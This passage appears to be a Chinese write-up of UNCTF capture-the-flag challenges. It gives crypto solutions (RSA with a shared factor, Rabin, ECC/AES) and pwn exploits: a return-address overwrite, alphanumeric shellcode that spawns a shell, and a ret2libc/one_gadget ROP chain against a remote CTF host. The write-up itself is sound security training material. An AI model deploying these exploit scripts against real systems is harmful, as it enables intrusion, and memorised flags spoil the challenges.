两个音频文件，看波形图，是摩斯密码，解密得到c1,c2
两个pem文件，用openssh打开得到两个模n和相同的e
根据加密脚本得知两个n有公约数
所以已知e p q
基础rsa解密，
exp：
    from gmpy2 import *
    def GCD(a, b):
        while b:
            a, b = b, a%b
        return a
    c1=4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351
    c2=485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349
    e=mpz(41221)
    n1=int('0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B',16)
    n2=int('0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553',16)
    #q=GCD(n1,n2)
    q = mpz(95652716952085928904432251307911783641637100214166105912784767390061832540987)
    print n2/q
    p1 = mpz(107527961531806336468215094056447603422487078704170855072884726273308088647617)
    p2 = mpz(89485735722023752007114986095340626130070550475022132484632643785292683293897)
    assert p1*q==n1
    assert p2*q==n2
    d1 = invert(e,(p1-1)*(q-1))
    d2 = invert(e,(p2-1)*(q-1))
    m1 = hex(pow(c1,d1,n1))[2:].decode('hex')
    m2 = hex(pow(c2,d2,n2))[2:].decode('hex')
    print m1,m2
flag：UNCTF{ac01dff95336aa470e3b55d3fe43e9f6}
###  一句话加密
拿到文件，python文件里没有啥，正常的rsa加密，
然后用010editor打开另外一张图片，发现底下有内容
猜测那个大数是n，先拿去分解一波，发现可行
但是，e呢？
突然，发现被分解出来的p和q很熟悉
上V爷爷博客！
p、q出现在V爷爷的Rabin密码的脚本里，那么这题就是Rabin密码了，，
那么直接上V爷爷脚本
    import gmpy2
    def n2s(num):
        t = hex(num)[2:]
        if len(t) % 2 == 1:
           return ('0'+t).decode('hex')
        return t.decode('hex')
    def decode(c):
        p = 275127860351348928173285174381581152299
        q = 319576316814478949870590164193048041239
        n = p*q
        r = pow(c,(p+1)/4,p)
        s = pow(c,(q+1)/4,q)
        a = gmpy2.invert(p,q)
        b = gmpy2.invert(q,p)
        x =(a*p*s+b*q*r)%n
        y =(a*p*s-b*q*r)%n
        print n2s(x%n)
        print n2s((-x)%n)
        print n2s(y%n)
        print n2s((-y)%n)
    c1=62501276588435548378091741866858001847904773180843384150570636252430662080263
    c2=72510845991687063707663748783701000040760576923237697638580153046559809128516
    decode(c1)
    decode(c2)
运行得到flag：unctf{412a1ed6d21e55191ee5131f266f5178}
###  ECC和AES基础
参考https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/
将底下的脚本的数据替换下
    G=E(6478678675, 5636379357093)
    pub = E(2854873820564,9226233541419)
    c1 = E(6860981508506,1381088636252)
    c2 = E(1935961385155, 8353060610242)
    X = G
    for i in range(1, 3000000):
        if X == pub:
            secret = i
            print "[+] secret:", i
            break
        else:
            X = X + G
            print i
    m = c2 - (c1 * secret)
    print "[+] x:", m[0]
    print "[+] y:", m[1]
    print "[+] x+y:", m[0] + m[1]
爆破得到secret=2019813
    x=1559343440829
     y=7468915163961
x即为aes_key
    from Crypto.Cipher import AES
    import base64
    key = bytes('1559343440829'.ljust(16,' '))
    aes = AES.new(key, AES.MODE_ECB)  
    data=base64.b64decode('/cM8Nx+iAidmt6RiqX8Vww==')
    ans = aes.decrypt(data)
    print ans
发现并不能解出来
这里有点小坑，C1和C2位置互换了
于是重新跑第一个脚本，C1和C2的值互换，secret之前已经爆破出来了
得到 x=1026
AES解密得
thisisa_flag
然后去目标url post
得到
flag：401E48C9A96DC219C32AB5E75204B655
## PWN
###  Sosoeasypwn
原本想泄露canary，后无意间发现，eip竟然被覆盖了，于是手测，发现输入12个a后即可控制eip。（这里输入了12个a和3个b加1个回车，可见eip被覆盖成了bbb\n）
IDA静态分析发现，是两个函数调用了同一个栈，然后栈内数据没清理，导致部分数据被重用
所以导致合法输入就可以覆盖v1的值。
由于开启了eip保护，但程序本身已经给了16位（4个字符），ida里可以看到后门函数的相对偏移，9CD
基址后12位（3个字符）都是0，那么仅需要爆破一个字符即可得到拿到shell
exp：
    #!/usr/bin/python
    from pwn import *
    context.log_level = 'debug'
    while True:
            try:
                    #sh = remote('101.71.29.5',10000)
                    sh = process("./pwn")
                  base_addr = sh.recvuntil(' world')
                  base_addr = hex(int(base_addr[-11:-6]))
                  sh.recvuntil('So, Can you tell me your name?')
                  sh.send('a'*12+p32(int(base_addr+'89cd',16))
                  sh.recvuntil('Please')
                  sh.sendline('ls')
                  sh.interactive()
           except Exception as e:
                    sh.close()
得到flag：UNCTF{S0soE4zy_Pwn}
###  EasyShellcode
反汇编看程序逻辑，就只是限制了shellcode的字符，要求在A-Za-z0-9之间
直接上V爷爷将shellcode转base64的工具
https://github.com/veritas501/ae64
exp：
    from pwn import *
    from ae64 import AE64
    context.log_level = 'debug'
    p=remote('101.71.29.5',10080)
    p.recvuntil('say?\n')
    obj = AE64()
    sc = obj.encode(asm(shellcraft.sh()))
    p.sendline(sc)
    p.interactive()
flag：UNCTF{x64A5c11shE11c0dEi550_Ea5y}
###  easy rop
这个很好绕过
发现有一个栈溢出，而且retaddr做了限制，这样就不能直接ret到system了（这里我用的是one_gadget），但是可以找gadget绕过（这里我找的是
ret ）
其中libc版本用LibcSearcher泄露出来，然后payload的偏移需要用’\x00’来填充，以满足one_gadget的条件。
exp:
    #!/usr/bin/python
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    #sh = process('./babyrop')
    sh = remote('101.71.29.5',10041)
    elf = ELF('./babyrop')
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = 0x08048592
    ret = 0x0804839e
    sh.recvuntil('Hello CTFer!')
    payload = '\x00'*0x20 + p32(0x66666666)
    sh.sendline(payload)
    sh.recvuntil('name?\n')
    payload = '\x00'*0x14  + p32(puts_plt) + p32(main_addr) + p32(puts_got)
    sh.sendline(payload)
    addr = u32(sh.recvuntil('\xf7')[-5:])
    libc = LibcSearcher('puts',addr)
    base = addr - libc.dump('puts')
    one_gadget = base + 0x3a819
    #one_gadget = base + 0x3ac69
    sh.recvuntil('Hello CTFer!')
    payload = p32(0)*8 + p32(0x66666666)
    sh.sendline(payload)
    sh.recvuntil('name?\n')
    payload = '\x00'*0x14 + p32(ret) +p32(one_gadget)
    sh.sendline(payload)
    sh.interactive()